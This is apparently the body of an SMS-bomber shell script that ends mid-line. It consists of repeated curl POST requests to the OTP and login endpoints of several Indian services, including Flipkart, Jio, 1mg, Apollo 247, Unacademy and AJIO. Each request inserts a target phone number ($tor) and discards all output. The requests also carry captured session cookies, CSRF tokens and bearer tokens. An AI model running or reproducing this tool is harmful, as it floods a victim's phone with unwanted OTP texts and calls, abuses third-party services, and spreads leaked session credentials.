
curl -X POST 'https://www.dealshare.in/api/1.0/get-otp' \
  -H 'authority: www.dealshare.in' \
  -H 'accept: application/json, text/plain, */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: _ga=GA1.1.8904892.1676565535; _fbp=fb.1.1676565536588.2105632294; WZRK_G=114b4b57bbe84314a56457daa2e84b71; WZRK_S_675-6K9-W76Z=%7B%22p%22%3A1%2C%22s%22%3A1676728612%2C%22t%22%3A1676728460%7D; _ga_17JC851ECY=GS1.1.1676728459.6.0.1676728461.0.0.0' \
  -H 'origin: https://www.dealshare.in' \
  -H 'referer: https://www.dealshare.in/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  --data-raw '{"phoneNumber":"$tor","name":"","hashCode":"","resendOtp":0,"source":"web"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'accept: */*' \
  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91$tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _gat_UA-69016858-2=1; _gat_UA-5306665-19=1; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; _ga_6JX23YC5TQ=GS1.1.1676749491.1.0.1676749493.0.0.0; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://login.web.ajio.com/api/auth/generateLoginOTP' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'accept: application/json' \
  -H 'content-type: application/json' \
  -H 'Referer: https://www.ajio.com/' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobileNumber":"$tor"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'client-version: 1819' \
  -H 'Authorization: Bearer' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Referer: https://www.pw.live/' \
  -H 'randomId: 9242fe67-d24e-4fb1-8859-3d726e2471e3' \
  -H 'client-id: 5eb393ee95fab7468a79d189' \
  -H 'Client-Type: WEB' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobile":"$tor","organizationId":"5eb393ee95fab7468a79d189"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; _dc_gtm_UA-21820217-6=1; _gat_UA-21820217-6=1; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; rl_session=RudderEncrypt%3AU2FsdGVkX1%2FVC3m%2FmoqzX17bt9B%2Fc0bmbo82X7X5Lc%2Bfb%2BjGRJRrdFf7OF6hkZaU%2FE60GEATjhBeZclfs9LQKGHWIgdNiociVoDP1l7dHwb%2BTe7rpO3FrGk%2B6oWN%2BVoHXxRxm1%2BNzUWiFi3zOpPG9Q%3D%3D; AWSALBTG=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT; AWSALBTGCORS=Z/Cvr1JO8zVmPLKL6jkvDltFGYqygKonwBiXLDFNhqiFK9jbIemlamkXahjAVa1rVSiiysuuSUTwetABAhdN8H8kLRWKwce24pTdK8dMNeeY7Q7T0S+4UzPXEG+wDI47guvLcrpYn2KDySepzaAwKq/3/kKIn9q+A3oP3j1LA1fT' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"$tor","is_corporate_user":false,"is_doctor":false}' \
  --compressed  > /dev/null 2>&1



curl -X POST 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; _nv_uid=173339004.1676729983.3ffe3c1c-7be0-41ad-855d-54d9c1821d4b.1676729983.1676729983.1.0; _nv_utm=173339004.1676729983.1.1.dXRtc3JjPWdvb2dsZXx1dG1jY249KG5vdCBzZXQpfHV0bWNtZD1vcmdhbmljfHV0bWN0cj0obm90IHByb3ZpZGVkKXx1dG1jY3Q9KG5vdCBzZXQpfGdjbGlkPShub3Qgc2V0KQ==; _nv_did=173339004.1676729983.10318094147tavoi; _ga_1HF6RR2VT7=GS1.1.1676729832.1.0.1676729832.0.0.0; _ga_NPGHGVF7FB=GS1.1.1676729832.1.0.1676729832.0.0.0; singular_device_id=523e24ec-85ce-4cc5-8a1d-f053dc51eb6a; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.890613511.1676729832; _gid=GA1.2.976323208.1676729833; outbrain_cid_fetch=true; shw_13453=1; _nv_banner_x=13453; _nv_hit=173339004.1676729983.cHZpZXc9MXxidmlldz1bIjEzNDUzIl0=; AWSALBTG=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; AWSALBTGCORS=DfsUbEZSlDPrsDYNT67nas897cRWx5/OVAOTdbqmdkLZtCY+2LbrDf+NEyc+CLy89gFBr5xJEfeTgAfBh75i2d8Z5RkUlEqkahbKSXC3qZzMQ+G7Npnww1qSvvMCuQKEwoUzdnXjRw+Ve4v/Js3XhY+S5a9BRyxYwfM6k965C5gJ; rl_session=RudderEncrypt%3AU2FsdGVkX19k1sKjNkmJ0%2BE2UJNIxhxyg8AG53dzSaIKZi0oI2Gl6DNxg66M5CAzF6LA1o3FmnDKyNgn5AwoTJVjE%2FTWnmtLhtj0Ysr2z%2B%2Bsf%2FSbHvSYHd3VJevNHij9AuM4Slxl388yg2%2BHHb82VA%3D%3D' \
  -H 'hkp-platform: Healthkartplus-0.0.1-Desktop' \
  -H 'origin: https://www.1mg.com' \
  -H 'pragma: no-cache' \
  -H 'referer: https://www.1mg.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'visitor-id: c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979' \
  -H 'x-csrf-token: qsV9AIy4-C0GI9ppMcea042GtPQ8WRA6AhlE' \
  -H 'x-html-canrender: True' \
  -H 'x-platform: Desktop-0.0.1' \
  --data-raw '{"number":"$tor","is_corporate_user":false,"otp_on_call":true}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
  -H 'authority: unacademy.com' \
  -H 'accept: */*' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'content-type: application/json' \
  -H 'cookie: isDarkModeOn=; proxy-user-uid=856546e5_d94d_4c92_b2ea_50601b466977; un_session_id=738747f0_073b_4eb6_b3b7_5f1fbb258522; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; anonymous_session_id=aeaeefcf_bd1f_46e6_848d_0eea5f87a8f8; _gcl_au=1.1.721686470.1676749491; __gtm_referrer=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.1865436011.1676749491; _ga=GA1.2.387904297.1676749491; _fbp=fb.1.1676749491677.513529990; ajs_anonymous_id=29f31176_c196_4600_86e7_6b6880e7ea35; _ga_6JX23YC5TQ=GS1.1.1676749491.1.1.1676749507.0.0.0; _uetsid=b7bec9f0afc411edb8fcf3e5b0242a00; _uetvid=bd557650d54211ecab6383e5aece31d2' \
  -H 'origin: https://unacademy.com' \
  -H 'referer: https://unacademy.com/' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'x-platform: 0' \
  --data-raw '{"phone":"$tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
  --compressed  > /dev/null 2>&1



curl -X POST 'https://www.jio.com/api/jio-login-service/login/sendOtp' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H $'Cookie: SITESJSESSIONID=2xBk7oI5jR0Y-GRLteTke-R5I6eFEHJs_CWk1Y0TuR4IDRaQ2_Hr\u0021-1907132197\u0021-189704043; JioSessionID=91abf871-8973-4feb-82a1-926728ac283d; ssjsid=91abf871-8973-4feb-82a1-926728ac283d; _gid=GA1.2.578086490.1676730500; _dc_gtm_UA-56816637-12=1; _fbp=fb.1.1676730499901.1776729079; _ga_KTDCM7ZGJS=GS1.1.1676730499.1.0.1676730499.0.0.0; _ga=GA1.1.799732335.1676730500; _gali=inputField' \
  -H 'Origin: https://www.jio.com' \
  -H 'Referer: https://www.jio.com/selfcare/login/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"mobileNumber":"$tor","loginFlowType":"MOBILE","alternateNumber":""}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://webapi.apollo247.com/' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Origin: https://www.apollopharmacy.in' \
  -H 'Referer: https://www.apollopharmacy.in/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'accept: */*' \
  -H 'authorization: Bearer 3d1833da7020e0602165529446587434' \
  -H 'content-type: application/json' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91$tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://1.rome.api.flipkart.com/api/7/user/otp/generate' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: T=TI166299454322100228265672717137192682858691518106239273611350617071; _pxvid=fc95190e-32aa-11ed-8211-737151746c61; _fbp=fb.1.1665941909264.2016798574; mp_eb8f3be4cfcba5edbd34bdd693d43768_mixpanel=%7B%22distinct_id%22%3A%20%22ACCD8A9F2E5ECD645C2A22F6571FCE95467%22%2C%22%24device_id%22%3A%20%22183efd65c3c5bd-05d60ef2c9bd28-26021f51-144000-183efd65c3d55a%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fseller.flipkart.com%2Fsell-online%2F%22%2C%22%24initial_referring_domain%22%3A%20%22seller.flipkart.com%22%2C%22%24user_id%22%3A%20%22ACCD8A9F2E5ECD645C2A22F6571FCE95467%22%2C%22role%22%3A%20%22Seller%22%2C%22first_login_time%22%3A%201666176146503%2C%22tenant%22%3A%20%22FLIPKART%22%7D; __pxvid=258ea1fa-6f3f-11ed-b670-0242ac120002; fpestid=GQ7LSyjiEQEdlRK9iCvOmb8NOhtTQbDII0YZaaf7o9qJcpbWJPJheR2Pad1p-MteRDWevA; _ga_WG71DKX9SR=GS1.1.1672994504.1.0.1672994513.0.0.0; _gcl_au=1.1.548366073.1673782569; _uetvid=636408804d7911edb2ce593ff927f0d9; mp_9ea3bc9a23c575907407cf80efd56524_mixpanel=%7B%22distinct_id%22%3A%20%22ACCD8A9F2E5ECD645C2A22F6571FCE95467%22%2C%22%24device_id%22%3A%20%22183efd6c9f9528-05f7549b47f46a-26021f51-144000-183efd6c9fa4f5%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22%24user_id%22%3A%20%22ACCD8A9F2E5ECD645C2A22F6571FCE95467%22%7D; _ga=GA1.2.965527632.1665941925; AMCV_55CFEDA0570C3FA17F000101%40AdobeOrg=-227196251%7CMCIDTS%7C19403%7CMCMID%7C44709716357227048839011662891478707677%7CMCAID%7CNONE%7CMCOPTOUT-1676366377s%7CNONE%7CMCAAMLH-1676799947%7C12%7CMCAAMB-1676359176%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_nr=1676359189606-Repeat; _ga_0SJLGHBL81=GS1.1.1676358805.179.1.1676359194.0.0.0; Network-Type=4g; pxcts=266b95d0-af9a-11ed-9744-424d566e787a; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; s_cc=true; K-ACTION=%22RESET%22; gpv_pn=HomePage; gpv_pn_t=FLIPKART%3AHomePage; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C19407%7CMCMID%7C67335531355863488131070626751210808106%7CMCAID%7CNONE%7CMCOPTOUT-1676738302s%7CNONE%7CMCAAMLH-1670775236%7C12%7CMCAAMB-1676731059%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; _px3=5a1836ee925c44b8db9a36ae244ec84c25ed27cd86e41995ebce2b567df01e05:pB4Jm1wOQ5hhkGwnBxbSylDAENKnVz4rtmXvwcs7RiL7Wk8ymK04K1fdbpYTB69RCCEvJ8wAD8k1amA5R9qiUQ==:1000:42EvqeDWkmgNx+uBvc0DEGQ6KG3pAydDUc+IA8g258/EJ2KaRz1WFHW8Jo+Lm3J99wqxsFj0zqmmkSaLzW8JNFwLcxw/0XhrgvtsnXphrbax0c3rJwJCgA2ZltHKSUrWmZ1uaRbdEffsoV5PBQ3f4lTuBuUr4jwgBw+Fpw4nd56ZtQ8Xwx65nF1vS8JoGwAvn+PKZ+dggWGDo7+AtjWMvA==; S=d1t13Pz8/Wz8/Pz8/Dz8/Yz8/PyIsll/3B7mwceLdKxh0Mig11kevMhuHwXx1xLm+oIF8gmSojskEnrKYTI6CKdTSYQ==; SN=VI65467C99D5D94A88B0272945D2537F29.TOKDFD9DEE4F4BB427EBA0252BD4649C2EE.1676731273.LO; s_sq=%5B%5BB%5D%5D' \
  -H 'Origin: https://www.flipkart.com' \
  -H 'Referer: https://www.flipkart.com/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-site' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
  -H 'X-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop' \
  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  --data-raw '{"loginId":"+91$tor"}' \
  --compressed  > /dev/null 2>&1


curl -X POST 'https://www.1mg.com/auth_api/v6/create_token' \
  -H 'authority: www.1mg.com' \
  -H 'accept: application/vnd.healthkartplus.v11+json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cache-control: no-cache, no-store, must-revalidate' \
  -H 'content-type: application/json' \
  -H 'cookie: VISITOR-ID=c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979; city=New%20Delhi; abVisitorId=939604; abExperimentShow=false; amoSessionId=34b0afff-b37b-4a23-bedc-b7c34f31585b; _csrf=AKH-us7dH8ukhnXxYddFxMWZ; isLocaleRedirect=false; isLocaleUIChange=false; _fbp=fb.1.1676729831196.2102042321; geolocation=false; session=r0At4uZPUY5KBP9z6oUE9g.HA9GWOAOjYmT0cW7sZaXEhSjNTb1lL41XKlBCewyOKRWlQySDPiHyAaeLFnMlcJZCdD6SoOU26xSUa2_2uTEfm__O-pT2Uii7ZM42LKWHWrdxvhKnd6MThYVg_8l0KvAykGQAwYt975e5Vk0WSIimg.1676729982547.144000000.0adMxuts723a2dhqUDZGfsJ-8K_iEXc6JT3KW1RxMG4; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2FStNdMwED%2BTTV06nDuNVSN5D9n4kk1GEM%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX19IBDFLZ9nEAjLNyMBHx%2FyetdQqTST8GcM%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FL%2FJFdNiK5YUutpw0MxOKaIDO1h97n7zk1V%2FJNVf2t8k44kCyEiFov02inrpzQjyeFDbO1VI1scA%3D%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2BfrS%2F1Yq%2BZHCBtJvR9sz4E7nyrWmSfPDKXHrPGCDl%2B9vZI9xcd6FZe; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18x3ztMsZrphb9%2FGq7adtf3%2BnqRhFkOY%2B5aDvSOGj81z4G5WiZXOxCx; rl_user_id=RudderEncrypt%3AU2FsdGVkX19tl15uVdl2F4HTtLqxkVYX5vVc13JJMRGsvBoqQDncUbQDp4lImDK6ng36A0qEasZXD4fsG1roJBtF%2Bu97PxBaE2eHI2hdoGA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX188%2BNRgVCrrioB2gso0chWwimiNCqv0acq9ZLzFkz2xRjIHAUruKYqloccZeJCOBlY04Fy1p8V9Iw%3D%3D; _uetsid=ef875af0af9611edbd12a720bc1ea225; _uetvid=ef87d4f0af9611ed995c477ccb56e9bb; _gcl_au=1.1.929593392.1676729832; _nv_sess=173339004.1676729983.9qooi8THZDgNOGZnK3IPdwynyi1Mm4kQtfLfQ3S4Xcg7kv8fpE; 